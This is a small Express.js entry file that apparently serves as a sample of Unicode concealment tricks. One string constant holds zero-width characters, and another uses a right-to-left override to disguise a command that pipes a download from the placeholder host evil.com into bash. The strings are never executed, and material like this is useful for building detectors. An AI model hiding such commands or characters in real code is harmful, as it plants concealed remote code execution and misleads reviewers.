// Application entry point
const express = require('express');
const app = express();

// Normal looking code with hidden zero-width characters
const config = "normal‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍ text";

// Right-to-left override to hide malicious commands
const safe = "check ‮ hsab | moc.live//:sptth lruc";

app.get('/', (req, res) => {
    res.send('Hello World');
});

app.listen(3000);
